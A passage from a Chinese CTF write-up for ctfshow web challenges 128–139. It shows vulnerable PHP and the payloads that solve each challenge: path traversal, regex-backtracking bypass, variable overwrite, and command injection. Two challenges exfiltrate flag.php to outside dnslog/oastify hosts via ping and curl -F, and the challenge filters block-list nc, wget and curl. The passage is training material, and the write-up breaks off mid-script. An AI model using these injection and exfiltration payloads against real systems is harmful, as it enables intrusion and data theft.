是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll</p><p>**get_defined_vars()**函数</p><p>get_defined_vars —&gt;返回由所有已定义变量所组成的数组 这样可以获得 $flag</p><p>Payload: <code>?f1=_&amp;f2=get_defined_vars</code></p><h4 id="web129-stripos-目录穿越"><a href="#web129-stripos-目录穿越" class="headerlink" title="web129(stripos  目录穿越)"></a>web129(stripos  目录穿越)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。如果没有找到字符串则返回 FALSE。</p><p><strong>注释：</strong>stripos() 函数是不区分大小写的。</p><p><strong>注释：</strong>该函数是二进制安全的。</p><p>目录穿越</p><p>Payload:</p><blockquote><p>?f&#x3D;.&#x2F;ctfshow&#x2F;..&#x2F;flag.php</p><p>?f&#x3D;.&#x2F;ctfshow&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php </p></blockquote><h4 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?ctfshow/is'</span><span class="token punctuation">,</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>1）第一个判断。<br>.+?表示匹配任意字符一个或则多个。<br>.*? 表示匹配任意字符0个或多个。</p><p>. 匹配除换行符 \n 之外的任何单字符。</p><ul><li>匹配前面的子表达式一次或多次。<br>? 匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。<br>&#x2F;i不区分大小写<br>&#x2F;s 匹配任何空白字符，包括空格、制表符、换页符等等。<br>题中整个正则表达式的意思就是，以任意一个或多个字符开头，遇到ctfshow就匹配，不区分大小写，不能有任何空白字符。</li></ul><p>也就是说输入的内容里，ctfshow前面不能有字符。</p><p>2）第二个判断。stripos函数如果未发现字符串将返回 FALSE。<br>全等于的条件是必须双方的类型也一样，所以ctfshow在首位返回的0与FLASE不全等。</p><p>所以payload:<code>POST:f=ctfshow</code></p><h4 id="web131-正则最大回溯"><a href="#web131-正则最大回溯" class="headerlink" title="web131(正则最大回溯)"></a>web131(正则最大回溯)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?ctfshow/is'</span><span class="token punctuation">,</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'36Dctfshow'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><a href="https://www.laruence.com/2010/06/08/1579.html">深悉正则(pcre)最大回溯&#x2F;递归限制</a></p><p>在php中正则表达式进行匹配有一定的限制，超过限制直接返回false</p><p>Poc</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token comment"># Construct the payload</span>preg <span class="token operator">=</span> <span class="token string">'very'</span> <span class="token operator">*</span> <span class="token number">250000</span> <span class="token operator">+</span> <span class="token string">'36Dctfshow'</span>payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'f'</span><span class="token punctuation">:</span> preg<span class="token punctuation">&#125;</span><span class="token comment"># The target URL</span>url <span class="token operator">=</span> <span class="token string">'https://b8e115f7-c0eb-4c76-9dd8-840b15166fb3.challenge.ctf.show/'</span><span class="token comment"># Send the POST request</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token comment"># Check for errors and print the response</span><span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Response:'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Failed to get a valid response. Status code:'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span></code></pre><h4 id="web132-PHP逻辑运算符绕过"><a href="#web132-PHP逻辑运算符绕过" class="headerlink" title="web132(PHP逻辑运算符绕过)"></a>web132(PHP逻辑运算符绕过)</h4><p>访问<code>robots.txt</code>–&gt;<code>/admin</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">===</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x36D</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">===</span> <span class="token variable">$flag</span> <span class="token operator">||</span> <span class="token variable">$username</span> <span class="token operator">===</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </code></pre><p><a href="https://www.cnblogs.com/hurry-up/p/10220082.html">PHP中逻辑运算符的高效用法—&amp;&amp;和||</a></p><p>对于“与”（**&amp;&amp;<strong>） 运算： <strong>x &amp;&amp; y</strong> 当</strong>x<strong>为</strong>false<strong>时，直接跳过，不执行</strong>y<strong>；<br>对于“或”（</strong>||<strong>） 运算 ：  <strong>x||y</strong> 当</strong>x<strong>为</strong>true<strong>时，直接跳过，不执行</strong>y**。</p><p>所以payload：<code>?code=admin&amp;password=1&amp;username=admin</code></p><h4 id="web133-substr绕过-DNSlog-Collaborator-Client"><a href="#web133-substr绕过-DNSlog-Collaborator-Client" class="headerlink" title="web133(substr绕过 DNSlog Collaborator Client)"></a>web133(substr绕过 DNSlog Collaborator Client)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$F</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/system|nc|wget|exec|passthru|netcat/i'</span><span class="token punctuation">,</span> <span class="token variable">$F</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"6个字母都还不够呀?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></span></code></pre><p>我们传递?F&#x3D;<code>$F</code>;+sleep 3好像网站确实sleep了一会说明的确执行了命令<br>那为什么会这样？<br>因为是我们传递的<code>$F</code>;+sleep 3。先进行substr()函数截断然后去执行eval()函数<br>这个函数的作用是执行php代码，是shell_exec()函数的缩写，然后就去命令执行。<br>而$F就是我们输入的<code>$F</code>;+sleep 3 使用最后执行的代码应该是<br><code>$F</code>;+sleep 3,就执行成功<br>这里可能有点绕，慢慢理解</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$F</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//?F=`$F`; sleep 3</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// `$F`; </span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// eval("`$F`; "); -> eval("``$F`; sleep 3`; "); "`" 只会被展开一次</span></code></pre><blockquote><p>利用<code>$F</code>;让eval执行shell语句。<br>这一串字符长度是5，加个空格，满足substr的6个字符截取，让eval执行<code>$F</code>;</p><p>如传递<code>$F</code>;+sleep 3，页面会sleep一会。具体执行过程如下：<br>&#x3D;&#x3D;&gt;php:   eval(substr($F,0,6));<br>&#x3D;&#x3D;&gt;php:   eval(“<code>$F</code>; “);<br>&#x3D;&#x3D;&gt;php:   eval(“&#96;&#96;$F<code>; sleep 3</code>; “);<br>&#x3D;&#x3D;&gt;shell: <code>$F</code>; sleep 3<br>所以就执行了sleep 3</p></blockquote><p>方法一(DNSlog外带)：（没成功）</p><p><a href="http://www.dnslog.cn/">在线DNSlog</a></p><p>先得到一个域名，然后利用dnslog实现命令回显。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://haha.0iix2r.dnslog.cn/<span class="token variable"><span class="token variable">`</span><span class="token function">whoami</span><span class="token variable">`</span></span><span class="token function">ping</span> <span class="token variable"><span class="token variable">`</span><span class="token function">whoami</span><span class="token variable">`</span></span>.0iix2r.dnslog.cn</code></pre><p>Payload:</p><p>当ping一个域名时会对其进行一个递归 DNS 查询的过程，这个时候就能在后端获取到 DNS 的查询请求，当命令真正被执行且平台收到回显时就能说明漏洞确实存在。</p><p>flag.php是多行，需要grep一下，其次不能含有特殊符号，所以tr设置一下返回结果只携带字母和数字。</p><pre class="language-bash" data-language="bash"><code class="language-bash">?F<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$F<span class="token variable">`</span></span><span class="token punctuation">;</span> <span class="token function">ping</span> <span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> flag.php <span class="token operator">|</span> <span class="token function">grep</span> ctfshow <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-cd</span> <span class="token string">'[a-z]'</span>/<span class="token string">'[0-9]'</span><span class="token variable">`</span></span>.3aqybg.dnslog.cn <span class="token parameter variable">-c</span> <span class="token number">1</span></code></pre><p>方法二( Collaborator Client Curl -F):</p><p>使用curl -F命令。-F 为带文件的形式发送post请求。</p><p>Payload:</p><pre class="language-bash" data-language="bash"><code class="language-bash">?F<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$F<span class="token variable">`</span></span><span class="token punctuation">;</span>+curl <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-F</span> <span class="token assign-left variable">xx</span><span class="token operator">=</span>@flag.php  http://smiegnphdyy8keqa8wcuo4ypfgl790xp.oastify.com</code></pre><p><img src="web133.png" loading="lazy"></p><h4 id="web134-变量覆盖"><a href="#web134-变量覆盖" class="headerlink" title="web134(变量覆盖)"></a>web134(变量覆盖)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$key1</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$key2</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nonononono"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key1</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'36d'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$key2</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'36d'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>看到parse_str和extract。变量覆盖<br>第一条if判断，要求key1和key2不能通过get和post传递。</p><p>parse_str是对get请求进行的内容解析成变量。例如传递?a&#x3D;1，执行后就是$a&#x3D;1。<br>那么相对的，传递<code>_POST</code>，就是对<code>$_POST</code>进行赋值，正好就可以绕过if条件对post的限制。<br>extract() 函数从数组中将变量导入到当前的符号表。</p><p>payload：<code>?_POST[key1]=36d&amp;_POST[key2]=36d</code></p><h4 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$F</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i'</span><span class="token punctuation">,</span> <span class="token variable">$F</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"师傅们居然破解了前面的，那就来一个加强版吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>限制了许多命令，ping可以用，读取命令<code>nl</code>可以用。<br>grep被限制了，可以用awk指定行号输出，不过需要逐行测试，在15行有flag。或者参考之前flag的格式，也可以推测出来是15。</p><p>这个题还把flag分成了两个，行号15和16，需要拼接一下。</p><p>Payload:</p><pre class="language-bash" data-language="bash"><code class="language-bash">?F<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$F<span class="token variable">`</span></span><span class="token punctuation">;</span>+ping <span class="token variable"><span class="token variable">`</span><span class="token function">nl</span> flag.php<span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'NR==15'</span><span class="token operator">|</span><span class="token function">tr</span> <span class="token parameter variable">-cd</span> <span class="token string">'[a-z]'</span>/<span class="token string">'[0-9]'</span><span class="token variable">`</span></span>.i1k4phddlneygl58oqbjxv93full9a.oastify.com</code></pre><p>发现新解法：</p><pre class="language-bash" data-language="bash"><code class="language-bash">?F<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$F<span class="token variable">`</span></span>+<span class="token punctuation">;</span>cp+flag.php+1.txt</code></pre><h4 id="web136-tee"><a href="#web136-tee" class="headerlink" title="web136(tee)"></a>web136(tee)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\>|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span><span class="token punctuation">,</span> <span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'too young too simple sometimes naive!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre><p><code>tee</code>用于显示程序的输出并将其复制到一个文件中。</p><p>Payload:</p><blockquote><p>?c&#x3D;ls &#x2F;|tee 1</p><p>?c&#x3D;cat &#x2F;f149_15_h3r3|tee 1</p></blockquote><h4 id="web137-call-user-func"><a href="#web137-call-user-func" class="headerlink" title="web137(call_user_func)"></a>web137(call_user_func)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshow</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"private class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><blockquote><p><a href="https://stackoverflow.com/questions/10534360/php-call-user-func-on-a-static-method">PHP call_user_func on a static method</a></p><pre class="language-none"><code class="language-none">$class &#x3D; &#39;\\MyBundleNamespace\\MyClass&#39;; $method &#x3D; &#39;myFunction&#39;;</code></pre><p>Both calls should work:</p><pre class="language-none"><code class="language-none">call_user_func(&quot;$class::$method&quot;); call_user_func(array($class, $method));</code></pre></blockquote><p>payload: <code>ctfshow=ctfshow::getFlag</code><br>payload: <code>ctfshow[]=ctfshow&amp;ctfshow[]=getFlag</code></p><h4 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h4><p>过滤了::但是可以用数组</p><h4 id="web139-命令盲注"><a href="#web139-命令盲注" class="headerlink" title="web139(命令盲注)"></a>web139(命令盲注)</h4><p>使用tee发现没有回显，可以使用命令盲注</p><p><strong>ls &#x2F;</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> string<span class="token builtin">str</span><span class="token 